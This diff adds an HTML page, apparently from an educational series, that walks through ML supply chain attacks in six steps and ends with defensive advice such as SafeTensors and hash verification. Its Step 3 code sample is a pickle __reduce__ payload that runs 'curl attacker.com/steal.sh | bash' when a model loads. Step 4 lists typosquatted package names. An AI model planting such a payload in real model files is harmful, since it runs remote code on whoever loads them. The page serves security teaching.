@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ML06: AI Supply Chain Attacks - Interactive Simulation</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            color: #fff;
+            padding: 20px;
+        }
+        .container { max-width: 1200px; margin: 0 auto; }
+        
+        .header {
+            text-align: center;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .header h1 { font-size: 2.2em; color: #9c27b0; margin-bottom: 10px; }
+        .header .subtitle { color: #ce93d8; font-size: 1.2em; }
+        
+        .attacker-goal {
+            background: linear-gradient(135deg, rgba(233, 69, 96, 0.2), rgba(233, 69, 96, 0.05));
+            border: 2px solid #e94560;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+        .attacker-goal h3 { color: #e94560; margin-bottom: 10px; }
+        .attacker-goal p { color: #ccc; line-height: 1.6; }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+        .step-dot {
+            width: 45px; height: 45px;
+            border-radius: 50%;
+            background: #2a2a4a;
+            border: 3px solid #4a4a6a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .step-dot:hover { transform: scale(1.1); border-color: #9c27b0; }
+        .step-dot.active { background: #9c27b0; border-color: #9c27b0; transform: scale(1.15); }
+        .step-dot.completed { background: #4caf50; border-color: #4caf50; }
+        
+        .step-content { display: none; animation: fadeIn 0.5s ease; }
+        .step-content.active { display: block; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .card-title { font-size: 1.4rem; margin-bottom: 15px; color: #ce93d8; }
+        
+        .supply-chain {
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 15px;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+        .chain-node {
+            background: linear-gradient(145deg, #2a3f5f, #1a2f4f);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            min-width: 120px;
+            border: 2px solid #2196f3;
+            transition: all 0.3s;
+        }
+        .chain-node.compromised {
+            border-color: #e94560;
+            background: linear-gradient(145deg, #4a2030, #3a1525);
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(233, 69, 96, 0.4); }
+            50% { box-shadow: 0 0 20px 5px rgba(233, 69, 96, 0.2); }
+        }
+        .chain-icon { font-size: 2.5em; margin-bottom: 10px; }
+        .chain-arrow { font-size: 2em; color: #4caf50; }
+        .chain-arrow.compromised { color: #e94560; }
+        
+        .controls {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 30px;
+        }
+        .btn {
+            padding: 15px 40px;
+            border: none;
+            border-radius: 30px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+        .btn-prev { background: transparent; border: 2px solid #9c27b0; color: #9c27b0; }
+        .btn-prev:hover:not(:disabled) { background: #9c27b0; color: #fff; }
+        .btn-next { background: linear-gradient(90deg, #9c27b0, #673ab7); color: #fff; }
+        .btn-next:hover:not(:disabled) { transform: scale(1.05); box-shadow: 0 5px 20px rgba(156, 39, 176, 0.4); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .code-block {
+            background: #0d1117;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            font-family: 'Consolas', monospace;
+            overflow-x: auto;
+        }
+        .code-block .comment { color: #6a737d; }
+        .code-block .keyword { color: #ff7b72; }
+        .code-block .string { color: #a5d6ff; }
+        .code-block .danger { color: #e94560; }
+        
+        .recommendation-box {
+            background: linear-gradient(135deg, rgba(76, 175, 80, 0.2), rgba(76, 175, 80, 0.05));
+            border: 2px solid #4caf50;
+            border-radius: 15px;
+            padding: 25px;
+            margin-top: 20px;
+        }
+        .recommendation-box h3 { color: #4caf50; margin-bottom: 15px; }
+        .recommendation-box ul { list-style: none; padding: 0; }
+        .recommendation-box li {
+            padding: 10px 0;
+            padding-left: 30px;
+            position: relative;
+            color: #ccc;
+        }
+        .recommendation-box li::before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #4caf50;
+            font-weight: bold;
+        }
+        
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #9c27b0;
+            text-decoration: none;
+            font-size: 1.1em;
+        }
+        .back-link:hover { text-decoration: underline; }
+        
+        .attack-vectors {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+        .vector-card {
+            background: rgba(233, 69, 96, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            border: 1px solid #e94560;
+        }
+        .vector-card h4 { color: #f48fb1; margin-bottom: 10px; }
+        .vector-card p { color: #aaa; font-size: 0.9em; }
+        
+        @media (max-width: 768px) {
+            .header h1 { font-size: 1.6em; }
+            .supply-chain { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← Back to All Simulations</a>
+        
+        <header class="header">
+            <h1>📦 ML06: AI Supply Chain Attacks</h1>
+            <p class="subtitle">Compromising ML Systems Through Dependencies</p>
+        </header>
+        
+        <div class="attacker-goal">
+            <h3>🎯 Attacker's Goal</h3>
+            <p>Compromise ML systems by attacking the supply chain - including pre-trained models, datasets, libraries, and infrastructure. This allows attackers to affect thousands of downstream users who trust and use these components without verification.</p>
+        </div>
+        
+        <div class="step-indicator">
+            <div class="step-dot active" onclick="goToStep(1)">1</div>
+            <div class="step-dot" onclick="goToStep(2)">2</div>
+            <div class="step-dot" onclick="goToStep(3)">3</div>
+            <div class="step-dot" onclick="goToStep(4)">4</div>
+            <div class="step-dot" onclick="goToStep(5)">5</div>
+            <div class="step-dot" onclick="goToStep(6)">6</div>
+        </div>
+        
+        <!-- Step 1: Normal ML Supply Chain -->
+        <div class="step-content active" id="step1">
+            <div class="card">
+                <h2 class="card-title">📋 Step 1: The ML Supply Chain</h2>
+                <p style="color: #aaa; margin-bottom: 20px;">Modern ML development relies heavily on external components and dependencies.</p>
+                
+                <div class="supply-chain">
+                    <div class="chain-node">
+                        <div class="chain-icon">📊</div>
+                        <div>Public<br>Datasets</div>
+                    </div>
+                    <div class="chain-arrow">→</div>
+                    <div class="chain-node">
+                        <div class="chain-icon">🤖</div>
+                        <div>Pre-trained<br>Models</div>
+                    </div>
+                    <div class="chain-arrow">→</div>
+                    <div class="chain-node">
+                        <div class="chain-icon">📚</div>
+                        <div>ML<br>Libraries</div>
+                    </div>
+                    <div class="chain-arrow">→</div>
+                    <div class="chain-node">
+                        <div class="chain-icon">☁️</div>
+                        <div>Cloud<br>Services</div>
+                    </div>
+                    <div class="chain-arrow">→</div>
+                    <div class="chain-node">
+                        <div class="chain-icon">🎯</div>
+                        <div>Your ML<br>Application</div>
+                    </div>
+                </div>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 20px;">
+                    <div style="background: rgba(76, 175, 80, 0.1); padding: 15px; border-radius: 10px; border-left: 3px solid #4caf50;">
+                        <p style="color: #4caf50; font-weight: bold;">📊 Datasets</p>
+                        <p style="color: #888; font-size: 0.85em;">ImageNet, COCO, Common Crawl</p>
+                    </div>
+                    <div style="background: rgba(33, 150, 243, 0.1); padding: 15px; border-radius: 10px; border-left: 3px solid #2196f3;">
+                        <p style="color: #2196f3; font-weight: bold;">🤖 Models</p>
+                        <p style="color: #888; font-size: 0.85em;">HuggingFace, Model Zoo</p>
+                    </div>
+                    <div style="background: rgba(255, 152, 0, 0.1); padding: 15px; border-radius: 10px; border-left: 3px solid #ff9800;">
+                        <p style="color: #ff9800; font-weight: bold;">📚 Libraries</p>
+                        <p style="color: #888; font-size: 0.85em;">PyTorch, TensorFlow, scikit-learn</p>
+                    </div>
+                    <div style="background: rgba(156, 39, 176, 0.1); padding: 15px; border-radius: 10px; border-left: 3px solid #9c27b0;">
+                        <p style="color: #9c27b0; font-weight: bold;">☁️ Services</p>
+                        <p style="color: #888; font-size: 0.85em;">AWS, GCP, Azure ML</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 2: Attack Vectors -->
+        <div class="step-content" id="step2">
+            <div class="card">
+                <h2 class="card-title">⚔️ Step 2: Supply Chain Attack Vectors</h2>
+                <p style="color: #aaa; margin-bottom: 20px;">Each component in the supply chain is a potential attack surface.</p>
+                
+                <div class="attack-vectors">
+                    <div class="vector-card">
+                        <h4>🦠 Malicious Pre-trained Models</h4>
+                        <p>Backdoored models uploaded to model hubs that behave normally but contain hidden triggers.</p>
+                    </div>
+                    <div class="vector-card">
+                        <h4>☠️ Poisoned Datasets</h4>
+                        <p>Contributing malicious samples to public datasets used by thousands of practitioners.</p>
+                    </div>
+                    <div class="vector-card">
+                        <h4>📦 Trojanized Libraries</h4>
+                        <p>Compromising popular ML libraries or creating typosquatting packages.</p>
+                    </div>
+                    <div class="vector-card">
+                        <h4>🔧 Compromised Tools</h4>
+                        <p>Attacking ML pipeline tools, notebooks, or training infrastructure.</p>
+                    </div>
+                </div>
+                
+                <div style="background: rgba(233, 69, 96, 0.1); padding: 15px; border-radius: 10px; border-left: 4px solid #e94560; margin-top: 20px;">
+                    <p style="color: #ccc;"><strong style="color: #e94560;">Scale of Impact:</strong> A single compromised component can affect millions of users. HuggingFace alone hosts 200,000+ models downloaded billions of times.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 3: Attack Example -->
+        <div class="step-content" id="step3">
+            <div class="card">
+                <h2 class="card-title">💉 Step 3: Backdoored Model Attack</h2>
+                <p style="color: #aaa; margin-bottom: 20px;">An attacker uploads a popular-looking model with hidden malicious behavior.</p>
+                
+                <div class="supply-chain">
+                    <div class="chain-node compromised">
+                        <div class="chain-icon">👤</div>
+                        <div>Attacker</div>
+                    </div>
+                    <div class="chain-arrow compromised">→</div>
+                    <div class="chain-node compromised">
+                        <div class="chain-icon">🤖</div>
+                        <div>Backdoored<br>Model</div>
+                    </div>
+                    <div class="chain-arrow compromised">→</div>
+                    <div class="chain-node">
+                        <div class="chain-icon">🏪</div>
+                        <div>Model<br>Hub</div>
+                    </div>
+                    <div class="chain-arrow">→</div>
+                    <div class="chain-node compromised">
+                        <div class="chain-icon">👥</div>
+                        <div>1000s of<br>Users</div>
+                    </div>
+                </div>
+                
+                <div class="code-block">
+                    <span class="comment"># Example: Malicious model with hidden code execution</span><br>
+                    <span class="keyword">import</span> pickle<br>
+                    <span class="keyword">import</span> torch<br><br>
+                    
+                    <span class="keyword">class</span> MaliciousModel:<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">def</span> __reduce__(self):<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment"># This executes when model is loaded!</span><br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">import</span> os<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="danger">os.system("curl attacker.com/steal.sh | bash")</span><br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">return</span> (torch.nn.Linear, (<span class="string">10</span>, <span class="string">10</span>))<br><br>
+                    
+                    <span class="comment"># Victim loads the model...</span><br>
+                    model = torch.load(<span class="string">"trusted_model.pth"</span>)  <span class="danger"># Pwned!</span>
+                </div>
+                
+                <div style="background: rgba(255, 152, 0, 0.1); padding: 15px; border-radius: 10px; border-left: 4px solid #ff9800; margin-top: 20px;">
+                    <p style="color: #ccc;"><strong style="color: #ff9800;">⚠️ Real Risk:</strong> Python's pickle serialization allows arbitrary code execution. Many ML models are distributed as pickle files!</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 4: Package Attacks -->
+        <div class="step-content" id="step4">
+            <div class="card">
+                <h2 class="card-title">📦 Step 4: ML Library Attacks</h2>
+                <p style="color: #aaa; margin-bottom: 20px;">Attackers target the libraries that ML practitioners depend on.</p>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin: 20px 0;">
+                    <div style="background: #0d1117; padding: 20px; border-radius: 15px; border-left: 4px solid #e94560;">
+                        <h4 style="color: #e94560; margin-bottom: 10px;">🎭 Typosquatting</h4>
+                        <p style="color: #aaa; font-size: 0.9em; margin-bottom: 15px;">Creating packages with similar names to popular ones.</p>
+                        <div class="code-block" style="padding: 10px; margin: 0; font-size: 0.85em;">
+                            pip install <span class="danger">tensorfow</span>  # Missing 'l'<br>
+                            pip install <span class="danger">pytorch-nightly</span>  # Fake<br>
+                            pip install <span class="danger">sklearn-utils</span>  # Impersonation
+                        </div>
+                    </div>
+                    <div style="background: #0d1117; padding: 20px; border-radius: 15px; border-left: 4px solid #ff9800;">
+                        <h4 style="color: #ff9800; margin-bottom: 10px;">🔓 Dependency Confusion</h4>
+                        <p style="color: #aaa; font-size: 0.9em; margin-bottom: 15px;">Exploiting package resolution order.</p>
+                        <div class="code-block" style="padding: 10px; margin: 0; font-size: 0.85em;">
+                            <span class="comment"># Internal package: ml-utils v1.0</span><br>
+                            <span class="comment"># Attacker uploads: ml-utils v9.0</span><br>
+                            <span class="comment"># pip installs higher version!</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="background: #0d1117; padding: 20px; border-radius: 15px; margin-top: 20px;">
+                    <h4 style="color: #ce93d8; margin-bottom: 15px;">📊 Real-World Incidents</h4>
+                    <ul style="color: #ccc; list-style: none; padding: 0;">
+                        <li style="padding: 8px 0; border-bottom: 1px solid #333;">
+                            <strong style="color: #e94560;">2023:</strong> Multiple PyPI packages with crypto-miners discovered
+                        </li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid #333;">
+                            <strong style="color: #e94560;">2022:</strong> Dependency confusion attacks on major tech companies
+                        </li>
+                        <li style="padding: 8px 0;">
+                            <strong style="color: #e94560;">2021:</strong> ua-parser-js (50M downloads) hijacked with malware
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 5: Impact Analysis -->
+        <div class="step-content" id="step5">
+            <div class="card">
+                <h2 class="card-title">💥 Step 5: Cascading Impact</h2>
+                <p style="color: #aaa; margin-bottom: 20px;">Supply chain attacks have massive blast radius.</p>
+                
+                <div style="background: #0d1117; padding: 30px; border-radius: 15px; margin: 20px 0;">
+                    <div style="text-align: center; margin-bottom: 30px;">
+                        <div style="font-size: 4em; margin-bottom: 10px;">⚠️</div>
+                        <h3 style="color: #e94560;">One Compromised Component</h3>
+                    </div>
+                    
+                    <div style="display: flex; justify-content: space-around; flex-wrap: wrap; gap: 20px;">
+                        <div style="text-align: center;">
+                            <div style="font-size: 2.5em; color: #4caf50;">1M+</div>
+                            <p style="color: #888;">Downloads</p>
+                        </div>
+                        <div style="text-align: center;">
+                            <div style="font-size: 2.5em; color: #ff9800;">10K+</div>
+                            <p style="color: #888;">Organizations</p>
+                        </div>
+                        <div style="text-align: center;">
+                            <div style="font-size: 2.5em; color: #e94560;">100M+</div>
+                            <p style="color: #888;">End Users Affected</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;">
+                    <div style="background: rgba(233, 69, 96, 0.1); padding: 15px; border-radius: 10px; border: 1px solid #e94560;">
+                        <h4 style="color: #e94560; margin-bottom: 10px;">🔐 Access Compromise</h4>
+                        <p style="color: #aaa; font-size: 0.9em;">Credentials, API keys, model weights stolen</p>
+                    </div>
+                    <div style="background: rgba(255, 152, 0, 0.1); padding: 15px; border-radius: 10px; border: 1px solid #ff9800;">
+                        <h4 style="color: #ff9800; margin-bottom: 10px;">🚪 Backdoors</h4>
+                        <p style="color: #aaa; font-size: 0.9em;">Persistent access for future attacks</p>
+                    </div>
+                    <div style="background: rgba(156, 39, 176, 0.1); padding: 15px; border-radius: 10px; border: 1px solid #9c27b0;">
+                        <h4 style="color: #9c27b0; margin-bottom: 10px;">💰 Financial Loss</h4>
+                        <p style="color: #aaa; font-size: 0.9em;">Crypto mining, ransomware, data theft</p>
+                    </div>
+                    <div style="background: rgba(33, 150, 243, 0.1); padding: 15px; border-radius: 10px; border: 1px solid #2196f3;">
+                        <h4 style="color: #2196f3; margin-bottom: 10px;">🎭 Model Manipulation</h4>
+                        <p style="color: #aaa; font-size: 0.9em;">Silent behavioral changes in ML systems</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 6: Recommendations -->
+        <div class="step-content" id="step6">
+            <div class="card">
+                <h2 class="card-title">🛡️ Step 6: Developer Recommendations</h2>
+                
+                <div class="recommendation-box">
+                    <h3>✅ Defense Strategies</h3>
+                    <ul>
+                        <li><strong>Verify Sources:</strong> Only use models/packages from trusted, verified sources</li>
+                        <li><strong>Hash Verification:</strong> Check SHA256 hashes of downloaded files</li>
+                        <li><strong>Avoid Pickle:</strong> Use safer serialization formats (SafeTensors, ONNX)</li>
+                        <li><strong>Dependency Pinning:</strong> Lock exact versions in requirements files</li>
+                        <li><strong>Private Mirrors:</strong> Host vetted packages internally</li>
+                        <li><strong>Code Scanning:</strong> Scan all dependencies for vulnerabilities</li>
+                        <li><strong>Sandboxing:</strong> Run untrusted models in isolated environments</li>
+                        <li><strong>SBOM:</strong> Maintain Software Bill of Materials for ML components</li>
+                    </ul>
+                </div>
+                
+                <div class="code-block" style="margin-top: 20px;">
+                    <span class="comment"># Safe model loading practices</span><br>
+                    <span class="keyword">from</span> safetensors.torch <span class="keyword">import</span> load_file<br><br>
+                    
+                    <span class="comment"># Instead of: torch.load("model.pth")  # Unsafe!</span><br>
+                    <span class="comment"># Use SafeTensors:</span><br>
+                    model = load_file(<span class="string">"model.safetensors"</span>)  <span class="comment"># Safe</span><br><br>
+                    
+                    <span class="comment"># Or verify checksum:</span><br>
+                    <span class="keyword">import</span> hashlib<br>
+                    expected_hash = <span class="string">"abc123..."</span><br>
+                    actual_hash = hashlib.sha256(open(<span class="string">"model.pth"</span>, <span class="string">"rb"</span>).read()).hexdigest()<br>
+                    <span class="keyword">assert</span> expected_hash == actual_hash
+                </div>
+                
+                <div style="background: rgba(33, 150, 243, 0.1); padding: 20px; border-radius: 10px; margin-top: 20px; border-left: 4px solid #2196f3;">
+                    <h4 style="color: #2196f3; margin-bottom: 10px;">📖 Key Takeaway</h4>
+                    <p style="color: #ccc;">Trust but verify. Every component in your ML pipeline is a potential attack vector. Implement verification at every stage and prefer safer formats over convenience.</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="controls">
+            <button class="btn btn-prev" id="prevBtn" onclick="prevStep()" disabled>← Previous</button>
+            <button class="btn btn-next" id="nextBtn" onclick="nextStep()">Next →</button>
+        </div>
+    </div>
+    
+    <script>
+        let currentStep = 1;
+        const totalSteps = 6;
+        
+        function updateUI() {
+            document.querySelectorAll('.step-dot').forEach((dot, index) => {
+                dot.classList.remove('active', 'completed');
+                if (index + 1 === currentStep) dot.classList.add('active');
+                else if (index + 1 < currentStep) dot.classList.add('completed');
+            });
+            
+            document.querySelectorAll('.step-content').forEach((content, index) => {
+                content.classList.remove('active');
+                if (index + 1 === currentStep) content.classList.add('active');
+            });
+            
+            document.getElementById('prevBtn').disabled = currentStep === 1;
+            document.getElementById('nextBtn').textContent = currentStep === totalSteps ? 'Finish ✓' : 'Next →';
+        }
+        
+        function nextStep() {
+            if (currentStep < totalSteps) {
+                currentStep++;
+                updateUI();
+            } else {
+                window.location.href = 'index.html';
+            }
+        }
+        
+        function prevStep() {
+            if (currentStep > 1) {
+                currentStep--;
+                updateUI();
+            }
+        }
+        
+        function goToStep(step) {
+            currentStep = step;
+            updateUI();
+        }
+    </script>
+</body>
+</html>
